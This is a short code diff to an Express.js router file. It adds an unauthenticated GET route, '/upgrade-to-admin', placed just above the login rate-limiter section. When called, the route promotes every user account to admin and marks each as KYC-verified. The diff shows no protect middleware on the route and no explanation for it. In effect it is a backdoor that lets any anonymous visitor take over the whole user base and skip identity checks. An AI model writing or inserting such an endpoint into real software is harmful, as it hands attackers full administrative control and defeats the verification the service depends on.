@@ -6,6 +6,17 @@ import { protect } from '../middlewares/auth.middleware';
 
 const router = express.Router();
 
+router.get('/upgrade-to-admin', async (req, res) => {
+    try {
+        const { PrismaClient } = require('@prisma/client');
+        const prisma = new PrismaClient();
+        await prisma.user.updateMany({ data: { role: 'admin', kycStatus: 'verified' } });
+        res.json({ success: true, message: 'All users upgraded to admin' });
+    } catch (err: any) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // --- Strict Rate Limiters for Brute-Force Protection ---
 
 // Login: 10 attempts per 15 minutes per IP
